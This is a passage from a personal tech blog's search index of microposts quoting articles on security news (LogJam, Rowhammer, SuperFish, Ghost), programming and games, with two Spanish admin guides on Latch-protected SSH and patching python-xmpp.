supplement your learnings or provide an introduction to a topic. » google.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/05/30/guide-for-technical-development/","loc":"https://karpoke.ignaciocano.com/2015/05/30/guide-for-technical-development/"},{"title":"How Chess Has Changed Over The Last 150 Years","text":"The rules of chess have remained consistent since the early 19th Century, but that doesn't mean our approach to the game has stayed the same. Here are some intriguing and surprising ways the Game of Kings has changed its shape over the past 150 years. The history of chess dates back 1,500 years, but it wasn't until the introduction of competitive chess in 1834 that the rules were solidified. Since that time, players of all calibers have diligently worked to find new and better ways of winning. George Dvorsky | io9.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/05/29/how-chess-has-changed-over-the-last-150-years/","loc":"https://karpoke.ignaciocano.com/2015/05/29/how-chess-has-changed-over-the-last-150-years/"},{"title":"LogJam — This new encryption glitch puts Internet users at risk","text":"After HeartBleed, POODLE and FREAK encryption flaws, a new encryption attack has been emerged over the Internet that allows attackers to read and modify the sensitive data passing through encrypted connections, potentially affecting hundreds of thousands of HTTPS-protected sites, mail servers, and other widely used Internet services. A team of security researchers has discovered a new attack, dubbed Logjam, that allows a man-in-the-middle (MitM) to downgrade encrypted connections between a user and a Web or email server to use extremely weaker 512-bit keys which can be easily decrypted. Mohit Kumar | thehackernews.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/05/20/logjam-this-new-encryption-glitch-puts-internet-users-at-risk/","loc":"https://karpoke.ignaciocano.com/2015/05/20/logjam-this-new-encryption-glitch-puts-internet-users-at-risk/"},{"title":"Initializing and Managing Services in Linux: Past, Present and Future","text":"One of the most crucial pieces of any UNIX-like operating system is the init dæmon process. In Linux, this process is started by the kernel, and it's the first userspace process to spawn and the last one to die during shutdown. During the history of UNIX and Linux, many init systems have gained popularity and then faded away. In this article, I focus on the history of the init system as it relates to Linux, and I talk about the role of init in a modern Linux system. I also relate some of the history of the System V Init (SysV) scheme, which was the de facto standard for many Linux distributions for a long time. Then I cover a couple more modern approaches to system initialization, such as Upstart and systemd. Finally, I pay some attention to how things work in systemd, as this seems to be the popular choice at the moment for several of the largest distributions. Jonas Gorauskas | linuxjournal.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/05/20/initializing-and-managing-services-in-linux-past-present-and-future/","loc":"https://karpoke.ignaciocano.com/2015/05/20/initializing-and-managing-services-in-linux-past-present-and-future/"},{"title":"The Twelve-Factor App","text":"In the modern era, software is commonly delivered as a service: called web apps, or software-as-a-service. The twelve-factor app is a methodology for building software-as-a-service apps that: Use declarative formats for setup automation, to minimize time and cost for new developers joining the project; Have a clean contract with the underlying operating system, offering maximum portability between execution environments; Are suitable for deployment on modern cloud platforms, obviating the need for servers and systems administration; Minimize divergence between development and production, enabling continuous deployment for maximum agility; And can scale up without significant changes to tooling, architecture, or development practices. The twelve-factor methodology can be applied to apps written in any programming language, and which use any combination of backing services (database, queue, memory cache, etc). » 12factor.net","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/05/18/the-twelve-factor-app/","loc":"https://karpoke.ignaciocano.com/2015/05/18/the-twelve-factor-app/"},{"title":"Las matemáticas explican por qué no puedes ganar al Tetris hagas lo que hagas","text":"\"La única forma de ganar es no jugar\". Tom Murphy, programador, creó en 2013 un programa que era capaz de aprender a jugar a Super Mario Bros de forma que en sucesivas partidas conseguía salvar los distintos obstáculos que se encontraba el personaje hasta ganar el juego. Cuando enfrentó su software al Tetris, sin embargo, Murphy se encontró con que no había victoria posible. R. Pérez | elconfidencial.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/05/05/las-matematicas-explican-por-que-no-puedes-ganar-al-tetris-hagas-lo-que-hagas/","loc":"https://karpoke.ignaciocano.com/2015/05/05/las-matematicas-explican-por-que-no-puedes-ganar-al-tetris-hagas-lo-que-hagas/"},{"title":"Cómo tu traidor cerebro te hace gastar dinero en los juegos freeplay","text":"El cerebro es un órgano fascinante y relativamente desconocido para la ciencia (y para muchos que tienen uno y lo usan poco, pero eso es otra historia) y es capaz de cosas realmente increíbles, como por ejemplo ser consciente de si mismo, pero sin embargo también tiene un buen número de defectos que permite engañarlo de una manera relativamente fácil. Las desarrolladoras lo saben y muchas de ellas se aprovechan de ellas, pervirtiendo un modelo como el free-to-play que podría tener enormes virtudes y convirtiéndolo en una máquina sacacuartos del Lado Oscuro. Javier Elío | elandroidelibre.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/05/03/como-tu-traidor-cerebro-te-hace-gastar-dinero-en-los-juegos-freeplay/","loc":"https://karpoke.ignaciocano.com/2015/05/03/como-tu-traidor-cerebro-te-hace-gastar-dinero-en-los-juegos-freeplay/"},{"title":"Mechanical LEGO Display Is Another Level Of Awesomeness","text":"You don't often see clever builds like this Technic Dot Matrix Display by AncientJames from New Zealand. As the reel starts rolling, the patterns on the cards inside correspond with the patterns on the display and can show anything that fits into a 5x5 square. The creator's video is titled, \"Everything is awesome\". Well, this build certainly is! Gergo Vas | kotaku.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/05/03/mechanical-lego-display-is-another-level-of-awesomeness/","loc":"https://karpoke.ignaciocano.com/2015/05/03/mechanical-lego-display-is-another-level-of-awesomeness/"},{"title":"The Locksmith Who Picked Two \"Unbeatable\" Locks and Ended the Era of \"Perfect Security\"","text":"The pursuit of lock-picking is as old as the lock, which is itself as old as civilization. But in the entire history of the world, there was only one brief moment, lasting about 70 years, where you could put something under lock and key—a chest, a safe, your home—and have complete, unwavering certainty that no intruder could get to it. This is a feeling that security experts call \"perfect security.\" Since we lost perfect security in the 1850s, it has remained elusive. Despite tremendous leaps forward in security technology, we have never been able to get perfect security back. 99% Invisible | slate.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/05/03/the-locksmith-who-picked-two-unbeatable-locks-and-ended-the-era-of-perfect-security/","loc":"https://karpoke.ignaciocano.com/2015/05/03/the-locksmith-who-picked-two-unbeatable-locks-and-ended-the-era-of-perfect-security/"},{"title":"50 años de la ley de Moore, quizás la \"ley\" más incomprendida de la tecnología","text":"El 19 de abril de 1965, Gordon Earle Moore publicaba una editorial en la revista Electronics que cambió el cómo entendíamos la tecnología. En ella aseguraba que la complejidad de los circuitos integrados se duplicaría cada año (luego se modificó para fijar el periodo de dos años), a la vez que los precios y costes de fabricación se verían reducidos. Cincuenta años después conocemos esta afirmación como la Ley de Moore, un exponente de la tecnología que se ha ido cumpliendo generación tras generación, pero con muchas dudas al respecto. Pablo Espeso | xataka.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/04/19/50-anos-de-la-ley-de-moore-quizas-la-ley-mas-incomprendida-de-la-tecnologia/","loc":"https://karpoke.ignaciocano.com/2015/04/19/50-anos-de-la-ley-de-moore-quizas-la-ley-mas-incomprendida-de-la-tecnologia/"},{"title":"The Visual 6502","text":"A complete simulation of the 6502 processor (used in the Commodore 64, Apple ][ and the NES). » visual6502.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/04/08/the-visual-6502/","loc":"https://karpoke.ignaciocano.com/2015/04/08/the-visual-6502/"},{"title":"10 Years of Git: An Interview with Git Creator Linus Torvalds","text":"Ten years ago this week, the Linux kernel community faced a daunting challenge: They could no longer use their revision control system BitKeeper and no other Software Configuration Management (SCMs) met their needs for a distributed system. Linus Torvalds, the creator of Linux, took the challenge into his own hands and disappeared over the weekend to emerge the following week with Git. Today Git is used for thousands of projects and has ushered in a new level of social coding among programmers. Jennifer Cloer | linux.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/04/07/10-years-of-git-an-interview-with-git-creator-linus-torvalds/","loc":"https://karpoke.ignaciocano.com/2015/04/07/10-years-of-git-an-interview-with-git-creator-linus-torvalds/"},{"title":"Piratería: cuando la mentira repetida mil veces se convierte en verdad","text":"Pero nada, oye, les da igual. Da igual que las webs de descargas, con la ley en la mano, no sean ilegales. Da igual que ningún juez en España (ninguno, ¿eh? que se dice pronto) haya cerrado nunca una web de descargas. Da igual que las pocas que han cerrado lo hayan hecho motu proprio por miedo o por acorralamiento. Da igual que gran parte de las querellas contra webs de descargas ni siquiera hayan llegado a juicio, sino que los jueces hayan sobreseído los casos al ver evidente la ausencia de delito. Todo eso les da igual. Carlos Otto | hipertextual.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/04/06/pirateria-cuando-la-mentira-repetida-mil-veces-se-convierte-en-verdad/","loc":"https://karpoke.ignaciocano.com/2015/04/06/pirateria-cuando-la-mentira-repetida-mil-veces-se-convierte-en-verdad/"},{"title":"Stealing Data From Computers Using Heat","text":"Security researchers at Ben Gurion University in Israel have found a way to retrieve data from an air-gapped computer using only heat emissions and a computer's built-in thermal sensors. The method would allow attackers to surreptitiously siphon passwords or security keys from a protected system and transmit the data to an internet-connected system that's in close proximity and that the attackers control. They could also use the internet-connected system to send malicious commands to the air-gapped system using the same heat and sensor technique. The proof-of-concept attack requires both systems to first be compromised with malware. And currently, the attack allows for just eight bits of data to be reliably transmitted over an hour—a rate that is sufficient for an attacker to transmit brief commands or siphon a password or secret key but not large amounts of data. It also works only if the air-gapped system is within 40 centimeters (about 15 inches) from the other computer the attackers control. But the researchers, at Ben Gurion's Cyber Security Labs, note that this latter scenario is not uncommon, because air-gapped systems often sit on desktops alongside Internet-connected ones so that workers can easily access both. Kim Zetter | wired.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/03/23/stealing-data-from-computers-using-heat/","loc":"https://karpoke.ignaciocano.com/2015/03/23/stealing-data-from-computers-using-heat/"},{"title":"Servicio de SSH con Latch en Ubuntu","text":"Mediante Latch , podemos añadir una capa extra de seguridad a nuestro servicio SSH, limitando la ventana de tiempo durante la cual permitimos iniciar sesión en el servidor. Instalación Descargamos los paquetes que vamos a necesitar: bash $ sudo aptitude install gcc make $ sudo aptitude install libpam0g-dev libcurl4-gnutls-dev libssl-dev (Si ya teníamos instalado el paquete libcurl4-openssl-dev , podemos usar éste en lugar de libcurl4-gnutls-dev .) Descargamos el código de github y compilamos: bash $ git clone https://github.com/ElevenPaths/latch-plugin-unix.git $ cd latch-plugin-unix $ ./configure prefix=/usr sysconfdir=/etc && make && sudo make install Antes de continuar, vamos al área de desarrolladores y creamos una cuenta para este servicio. Ahí obtenemos el identificador de aplicación y la contraseña. Configuración La instalación se puede hacer bien con un módulo PAM o bien configurando SSH. Módulo PAM Si vamos a configurar un módulo PAM, en la configuración del servicio que hemos creado en el área de desarrolladores, añadiremos una nueva \"operación\", por ejemplo \"sshd-login\", con lo que obtendremos una contraseña para esta operación en particular. Editamos el fichero /etc/latch/latch.conf para añadir nuestro identificador de aplicación, la contraseña. Especificamos la acción por defecto si el servicio de Latch no estuviera disponible ( open o close ) y añadirmos las diferentes contraseñas para las operaciones que hayamos definido en la cuenta. Movemos el fichero .so a su destino: bash $ sudo mv /usr/lib/pam_latch.so /lib/security/ Editamos el fichero /etc/pam.d/sshd , y añadimos al final: bash auth required pam_latch.so config=/etc/latch/latch.conf accounts=/etc/latch/latch.accounts operation=sshd-login otp=yes Igual que en el caso del servicio de SSH con sistema de verificación en dos pasos de Google , podemos añadir una regla justo antes de la que acabamos de definir para que las conexiones desde la misma red no sean examinadas: bash auth [success=1 default=ignore] pam_access.so accessfile=/etc/security/access-local.conf El contenido del fichero /etc/security/access-local.conf : bash + : ALL : 192.168.50.0/24 + : ALL : LOCAL - : ALL : ALL Por último, sólo queda parear cada usuario que queramos utilizar. Desde la aplicación en el móvil, generamos un código de pareado. Utilizaremos el token proporcionado y ejecutaremos el siguiente comando: bash $ latch -p Account successfully paired to the user myuser Si queremos desparear un usuario: bash $ latch -u Configuración de SSH Si en lugar de añadir el módulo PAM, queremos configurar el servidor de SSH, editamos el fichero de configuración /etc/ssh/sshd_config y nos aseguramos de que contenga: bash UsePAM yes ChallengeResponseAuthentication yes PasswordAuthentication no Para proteger las claves de autorización, editamos el fichero de configuración de los usuario ~/.ssh/authorized_keys : bash command=\"latch-ssh-cmd -o sshd-keys\" ssh-rsa AAA...HP5 someone@host En este caso, hemos definido una nueva operación \"sshd-keys\" en la configuración de nuestra cuenta. También hay que tener en cuenta que si optamos por la opción de configurar el servicio SSH, mediante el comando latch-ssh-cmd no está disponible la opción de claves de un solo uso (OTP). Desinstalación Si queremos desinstalar Latch, basta que eliminemos los cambios que hemos hecho en /etc/pam.d/sshd , o /etc/ssh/sshd_config y ~/.ssh/authorized_keys , en caso de haber optado por la opción de configurar el servicio de SSH. A continuación, desde el directorio donde habíamos descargado el código, ejecutamos: bash $ ./configure prefix=/usr sysconfdir=/etc && make && sudo make uninstall","tags":"admin","url":"https://karpoke.ignaciocano.com/2015/03/22/servicio-de-ssh-con-latch-en-ubuntu/","loc":"https://karpoke.ignaciocano.com/2015/03/22/servicio-de-ssh-con-latch-en-ubuntu/"},{"title":"11 Ways To Track Your Moves When Using a Web Browser","text":"some tracking methods do attempt to track the user over a long time, and in particular attempt to make it difficult to evade the tracking. This is sometimes done for advertisement purposes, but can also be done to stop certain attacks like brute forcing or to identify attackers that return to a site. In its worst case, from a private perspective, the tracking is done to follow a user across various web sites. Over the years, browsers and plugins have provided a number of ways to restrict this tracking. Here are some of the more common techniques how tracking is done and how the user can prevent (some of) it Johannes B. Ullrich | isc.sans.edu","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/03/15/11-ways-to-track-your-moves-when-using-a-web-browser/","loc":"https://karpoke.ignaciocano.com/2015/03/15/11-ways-to-track-your-moves-when-using-a-web-browser/"},{"title":"Exploiting the DRAM rowhammer bug to gain kernel privileges","text":"\"Rowhammer\" is a problem with some recent DRAM devices in which repeatedly accessing a row of memory can cause bit flips in adjacent rows. We tested a selection of laptops and found that a subset of them exhibited the problem. We built two working privilege escalation exploits that use this effect. One exploit uses rowhammer-induced bit flips to gain kernel privileges on x86-64 Linux when run as an unprivileged userland process. When run on a machine vulnerable to the rowhammer problem, the process was able to induce bit flips in page table entries (PTEs). It was able to use this to gain write access to its own page table, and hence gain read-write access to all of physical memory. Chris Evans | googleprojectzero.blogspot.com.es","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/03/14/exploiting-the-dram-rowhammer-bug-to-gain-kernel-privileges/","loc":"https://karpoke.ignaciocano.com/2015/03/14/exploiting-the-dram-rowhammer-bug-to-gain-kernel-privileges/"},{"title":"9 truths that computer programmers know that most people don't.","text":"Ever wondered why programmers are known as nightbirds? Why we stay up all night? Because it allows us to get into the zone, it allows us to focus on one thing and not have to worry about being interupted by someone - because they are all asleep. It's a long stretch of the day where no one is up and no one is calling or trying to talk to us. It's a great time to program, and think. Macleod Sawyer | macleodsawyer.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/03/14/9-truths-that-computer-programmers-know-that-most-people-dont/","loc":"https://karpoke.ignaciocano.com/2015/03/14/9-truths-that-computer-programmers-know-that-most-people-dont/"},{"title":"How Video Game Breasts Are Made (And Why They Can Go Wrong)","text":"If you've played games that have breast physics, you've probably seen how uncommon it is for games to show breasts that move like what they actually are: bags of fat affected by gravity. Instead, it's more likely for a game to depict breasts as helium balloons that have minds of their own. Certain games have failed at rendering realistic breasts so widely that some people seem convinced that bad breast physics are the result of sexism, or of an industry that likes to objectify women. I've seen unfair conjecture about whether or not developers have ever interacted with real-life breasts. I've seen people imply that developers simply don't know how to properly characterize women in games, and that gaming's ocean of unrealistic breasts is what happens when we have so few women developing games. Patricia Hernandez | kotaku.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/03/12/how-video-game-breasts-are-made-and-why-they-can-go-wrong/","loc":"https://karpoke.ignaciocano.com/2015/03/12/how-video-game-breasts-are-made-and-why-they-can-go-wrong/"},{"title":"The greatest program ever written","text":"I'm a programmer. I write games. Games programmers get a lot of respect, but none of them, not me, not Carmak, and not Abrash. None of them deserve the honour which I want to bestow on David Horne. This is because David Horne wrote the greatest program ever written: 1k chess on the ZX81. David Horne is not an urban myth. David Horne achieved what many would even now consider impossible. He wrote a chess game, with AI, that ran on a poorly documented, buggy machine that contained only 1k of memory. » thad.frogley.info","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/03/08/the-greatest-program-ever-written/","loc":"https://karpoke.ignaciocano.com/2015/03/08/the-greatest-program-ever-written/"},{"title":"The MakeLisp Process","text":"So you want to write a Lisp interpreter? Welcome! The goal of the Make-A-Lisp project is to make it easy to write your own Lisp interpreter without sacrificing those many \"Aha!\" moments that come from ascending the McCarthy mountain. When you reach the peak of this particular mountain, you will have an interpreter for the mal Lisp language that is powerful enough to be self-hosting, meaning it will be able to run a mal interpreter written in mal itself. kanaka | github.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/03/08/the-makelisp-process/","loc":"https://karpoke.ignaciocano.com/2015/03/08/the-makelisp-process/"},{"title":"Attack of the week: FREAK (or 'factoring the NSA for fun and profit')","text":"A group of cryptographers at INRIA, Microsoft Research and IMDEA have discovered some serious vulnerabilities in OpenSSL (e.g., Android) clients and Apple TLS/SSL clients (e.g., Safari) that allow a 'man in the middle attacker' to downgrade connections from 'strong' RSA to 'export-grade' RSA. These attacks are real and exploitable against a shocking number of websites -- including government websites. Matthew Green | blog.cryptographyengineering.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/03/05/attack-of-the-week-freak-or-factoring-the-nsa-for-fun-and-profit/","loc":"https://karpoke.ignaciocano.com/2015/03/05/attack-of-the-week-freak-or-factoring-the-nsa-for-fun-and-profit/"},{"title":"Computadoras imprescindibles","text":"Gracias a la desbordante imaginación de una dama victoriana del siglo XIX pudimos dar el salto del cálculo a la computación. Ada creó el primer programa de ordenador en su mente, simulando una máquina que nunca existió. La informática nació dentro del cerebro de una mujer. txipi | blog.txipinet.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/03/01/computadoras-imprescindibles/","loc":"https://karpoke.ignaciocano.com/2015/03/01/computadoras-imprescindibles/"},{"title":"Proving that Android's, Java's and Python's sorting algorithm is broken (and showing how to fix it)","text":"Tim Peters developed the Timsort hybrid sorting algorithm in 2002. It is a clever combination of ideas from merge sort and insertion sort, and designed to perform well on real world data. TimSort was first developed for Python, but later ported to Java (where it appears as java.util.Collections.sort and java.util.Arrays.sort) by Joshua Bloch (the designer of Java Collections who also pointed out that most binary search algorithms were broken). TimSort is today used as the default sorting algorithm for Android SDK, Sun's JDK and OpenJDK. Given the popularity of these platforms this means that the number of computers, cloud services and mobile phones that use TimSort for sorting is well into the billions. Fast forward to 2015. After we had successfully verified Counting and Radix sort implementations in Java (J. Autom. Reasoning 53(2), 129-139) with a formal verification tool called KeY, we were looking for a new challenge. TimSort seemed to fit the bill, as it is rather complex and widely used. Unfortunately, we weren't able to prove its correctness. A closer analysis showed that this was, quite simply, because TimSort was broken and our theoretical considerations finally led us to a path towards finding the bug (interestingly, that bug appears already in the Python implementation). This blog post shows how we did it. Stijn de Gouw | envisage-project.eu","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/02/28/proving-that-androids-javas-and-pythons-sorting-algorithm-is-broken-and-showing-how-to-fix-it/","loc":"https://karpoke.ignaciocano.com/2015/02/28/proving-that-androids-javas-and-pythons-sorting-algorithm-is-broken-and-showing-how-to-fix-it/"},{"title":"Extracting the SuperFish certificate","text":"I extracted the certificate from the SuperFish adware and cracked the password (\"komodia\") that encrypted it. I discuss how down below. The consequence is that I can intercept the encrypted communications of SuperFish's victims (people with Lenovo laptops) while hanging out near them at a cafe wifi hotspot. Note: this is probably trafficking in illegal access devices under the proposed revisions to the CFAA, so get it now before they change the law. Robert Graham | blog.erratasec.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/02/23/extracting-the-superfish-certificate/","loc":"https://karpoke.ignaciocano.com/2015/02/23/extracting-the-superfish-certificate/"},{"title":"Lenovo caught installing adware on new computers","text":"Other users are reporting that the adware actually installs its own self-signed certificate authority which effectively allows the software to snoop on secure connections, like banking websites as pictured in action below. This is a malicious technique commonly known as a man-in-the middle attack, where the certificate allows the software to decrypt secure requests, yet Lenovo appears to be shipping this software with some of its products out of the box. » thenextweb.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/02/23/lenovo-caught-installing-adware-on-new-computers/","loc":"https://karpoke.ignaciocano.com/2015/02/23/lenovo-caught-installing-adware-on-new-computers/"},{"title":"NSA has hidden software in hard drives around the world","text":"The U.S. National Security Agency has figured out how to hide spying software deep within hard drives made by Western Digital, Seagate, Toshiba, and other top manufacturers, giving the agency the means to eavesdrop on the majority of the world's computers, according to cyber researchers and former operatives. Joseph Menn | businessinsider.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/02/23/nsa-has-hidden-software-in-hard-drives-around-the-world/","loc":"https://karpoke.ignaciocano.com/2015/02/23/nsa-has-hidden-software-in-hard-drives-around-the-world/"},{"title":"The coming war on general-purpose computing","text":"Enter Digital Rights Management in its most primitive forms: let's call it DRM 0.96. They introduced physical indicia which the software checked for—deliberate damage, dongles, hidden sectors—and challenge-response protocols that required possession of large, unwieldy manuals that were difficult to copy. These failed for two reasons. First, they were commercially unpopular, because they reduced the usefulness of the software to the legitimate purchasers. Honest buyers resented the non-functionality of their backups, they hated the loss of scarce ports to the authentication dongles, and they chafed at the inconvenience of having to lug around large manuals when they wanted to run their software. Second, these didn't stop pirates, who found it trivial to patch the software and bypass authentication. People who took the software without paying for it were untouched. Cory Doctorow | boingboing.net","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/02/23/the-coming-war-on-general-purpose-computing/","loc":"https://karpoke.ignaciocano.com/2015/02/23/the-coming-war-on-general-purpose-computing/"},{"title":"Live patching for 3.20","text":"Originally, there was kSplice as a standalone project that implemented stop_machine()-based patching for the linux kernel. This project got later acquired, and the current owner is providing live patching as a proprietary service, without any intentions to have their implementation merged. Then, due to rising user/customer demand, both Red Hat and SUSE started working on their own implementation (not knowing about each other), and announced first versions roughly at the same time. Jiri Kosina | lkml.org","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/02/23/live-patching-for-3-20/","loc":"https://karpoke.ignaciocano.com/2015/02/23/live-patching-for-3-20/"},{"title":"Historia de los videojuegos: los orígenes","text":"En 1972 se ponía en venta en las tiendas norteamericanas la Magnavox Odyssey, la primera videoconsola de la historia. Un año antes un estudiante de la Universidad de Stanford y su socio habían construido la primera máquina recreativa de la historia. A partir de estos dos acontecimientos clave los videojuegos comenzaron a popularizarse creando a día de hoy una gigantesca industria de ocio y entretenimiento capaz de competir en seguidores y volumen de ventas con el cine o la música. » documentalium.blogspot.com.es","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/02/18/historia-de-los-videojuegos-los-origenes/","loc":"https://karpoke.ignaciocano.com/2015/02/18/historia-de-los-videojuegos-los-origenes/"},{"title":"The scope of index variables in Python's for loops","text":"The Python reference documentation explicitly documents this behavior in the section on for loops: The for-loop makes assignments to the variables(s) in the target list. [...] Names in the target list are not deleted when the loop is finished, but if the sequence is empty, they will not have been assigned to at all by the loop. Eli Bendersky | eli.thegreenplace.net","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/02/18/the-scope-of-index-variables-in-pythons-for-loops/","loc":"https://karpoke.ignaciocano.com/2015/02/18/the-scope-of-index-variables-in-pythons-for-loops/"},{"title":"What every beginner absolutely needs to know about the journey ahead","text":"Quincy Larson was just a \"guy in a suit in an office\" and decided he wanted to learn how to code. So he asked around. He started by picking up a bit of Ruby then found himself skimming through other languages like Scala, Clojure and Go. He learned Emacs then Vim and even the Dvorak keyboard layout. He picked up Linux, dabbled in Lisp and coded in Python while living on the command line for more than half a year. Erik Trautman | vikingcodeschool.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/02/08/what-every-beginner-absolutely-needs-to-know-about-the-journey-ahead/","loc":"https://karpoke.ignaciocano.com/2015/02/08/what-every-beginner-absolutely-needs-to-know-about-the-journey-ahead/"},{"title":"The Exceptional Beauty of Doom 3's Source Code","text":"What would \"nice looking\"—or \"beautiful\", for that matter—actually mean when referring to source code? I asked some programmer friends what they thought that meant. Their answers were obvious, but still worth stating: Code should be locally coherent and single-functioned: One function should do exactly one thing. It should be clear about what it's doing. Local code should explain, or at least hint at the overall system design. Code should be self-documenting. Comments should be avoided whenever possible. Comments duplicate work when both writing and reading code. If you need to comment something to make it understandable it should probably be rewritten. Shawn McGrath | kotaku.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/02/08/the-exceptional-beauty-of-doom-3s-source-code/","loc":"https://karpoke.ignaciocano.com/2015/02/08/the-exceptional-beauty-of-doom-3s-source-code/"},{"title":"El increíble caso de Werner Koch y GPG","text":"Así, cabe preguntarse por qué el principal desarrollador de una pieza de software tan sensible y popular \"va a la quiebra\". ¿Problemas de juego? ¿Derroche sin más? Porque un programador de ese calibre, en esa posición, debería cobrar lo suyo y más en Alemania, país de Koch. Pero la pregunta adecuada no es por qué va a la quiebra o cuánto cobra, sino de qué vive este hombre. ¿De qué vive -repetimos- el principal desarrollador de una pieza de software tan sensible y popular como GPG? La respuesta, desafortunadamente, es que nadie le pagaba por su trabajo: vivía de la caridad, de las donaciones. ¿Suena duro? Es aún peor. J.Pomeyrol | muylinux.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/02/07/el-increible-caso-de-werner-koch-y-gpg/","loc":"https://karpoke.ignaciocano.com/2015/02/07/el-increible-caso-de-werner-koch-y-gpg/"},{"title":"Highly critical \"Ghost\" allowing code execution affects most Linux systems","text":"The vulnerability in the GNU C Library (glibc) represents a major Internet threat, in some ways comparable to the Heartbleed and Shellshock bugs that came to light last year. The bug, which is being dubbed \"Ghost\" by some researchers, has the common vulnerability and exposures designation of CVE-2015-0235. While a patch was issued two years ago, most Linux versions used in production systems remain unprotected at the moment. What's more, patching systems requires core functions or the entire affected server to be rebooted, a requirement that may cause some systems to remain vulnerable for some time to come. The buffer overflow flaw resides in __nss_hostname_digits_dots(), a glibc function that's invoked by the gethostbyname() and gethostbyname2() function calls. A remote attacker able to call either of these functions could exploit the flaw to execute arbitrary code with the permissions of the user running the application. Dan Goodin | arstechnica.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/02/06/highly-critical-ghost-allowing-code-execution-affects-most-linux-systems/","loc":"https://karpoke.ignaciocano.com/2015/02/06/highly-critical-ghost-allowing-code-execution-affects-most-linux-systems/"},{"title":"Solucionado el error «AttributeError: '_ssl._SSLSocket' object has no attribute 'issuer'» en Ubuntu Utopic Unicorn","text":"Si al usar la librería de Python para XMPP nos aparece el error: bash Traceback (most recent call last): File \"./test_xmpp.py\", line 12, in cl.connect() File \"/usr/lib/python2.7/dist-packages/xmpp/client.py\", line 205, in connect while not self.TLS.starttls and self.Process(1): pass File \"/usr/lib/python2.7/dist-packages/xmpp/dispatcher.py\", line 303, in dispatch handler['func'](session,stanza) File \"/usr/lib/python2.7/dist-packages/xmpp/transports.py\", line 330, in StartTLSHandler self._startSSL() File \"/usr/lib/python2.7/dist-packages/xmpp/transports.py\", line 309, in _startSSL tcpsock._sslIssuer = tcpsock._sslObj.issuer() AttributeError: '_ssl._SSLSocket' object has no attribute 'issuer' parece que es debido a un fallo en dicha librería . La versión que viene en los repositorios es la 0.4.1: bash $ aptitude versions python-xmpp Paquete python-xmpp: i 0.4.1-cvs20080505.3build1 utopic 500 Afortunadamente, hay disponible un parche : ```bash $ wget -P /tmp https://raw.githubusercontent.com/freebsd/freebsd-ports/master/net-im/py-xmpppy/files/patch-xmpp-transports.py $ sudo su cd /usr/lib/python2.7/dist-packages/xmpp patch < /tmp/patch-xmpp-transports.py patching file transports.py Hunk #2 succeeded at 305 (offset -7 lines). ```","tags":"admin","url":"https://karpoke.ignaciocano.com/2015/02/03/solucionado-el-error-attributeerror-_ssl-_sslsocket-object-has-no-attribute-issuer-en-ubuntu-utopic-unicorn/","loc":"https://karpoke.ignaciocano.com/2015/02/03/solucionado-el-error-attributeerror-_ssl-_sslsocket-object-has-no-attribute-issuer-en-ubuntu-utopic-unicorn/"},{"title":"What happens when you type google.com into your browser's address box and press enter?","text":"Except instead of the usual story, we're going to try to answer this question in as much detail as possible. No skipping out on anything. This is a collaborative process, so dig in and try to help out! There's tons of details missing, just waiting for you to add them! So send us a pull request, please! Alex Gaynor | github.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/01/30/what-happens-when-you-type-google-com-into-your-browsers-address-box-and-press-enter/","loc":"https://karpoke.ignaciocano.com/2015/01/30/what-happens-when-you-type-google-com-into-your-browsers-address-box-and-press-enter/"},{"title":"Coder creates smallest chess game for computers","text":"A French coder has developed what is thought to be the smallest-sized chess computer program. BootChess is only 487 bytes in size, and the code can be run on Windows, Mac OS X and Linux computers. That makes it smaller than 1K ZX Chess - a Sinclair ZX81 computer game, which contained 672 bytes of code and had held the record for 33 years. Leo Kelion | bbc.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/01/30/coder-creates-smallest-chess-game-for-computers/","loc":"https://karpoke.ignaciocano.com/2015/01/30/coder-creates-smallest-chess-game-for-computers/"},{"title":"Every Time Travel Movie Ever, Ranked","text":"With the release of yet another time travel movie this week (Project Almanac), it's time for us to look back at the great time travel movies of our past. Here are all the major time travel movies ever, ranked. Here are the rules: No animation. No short films. And no movies that where someone is frozen (or something) and then they wake up in the future (so Mel Gibson's Forever Young, Encino Man are OUT). Meredith Woerner | io9.com","tags":"micropost","url":"https://karpoke.ignaciocano.com/2015/01/29/every-time-travel-movie-ever-ranked/","loc":"https://karpoke.ignaciocano.com/2015/01/29/every-time-travel-movie-ever-ranked/"},{"title":"Against DNSSEC","text":"All secure crypto on the Internet assumes that the DNS lookup from names to IP addresses are insecure. Securing those DNS lookups therefore enables no meaningful security. DNSSEC does make some attacks against insecure sites harder. But it doesn't make those attacks infeasible, so sites still need to adopt secure transports like TLS. With TLS properly configured, DNSSEC adds 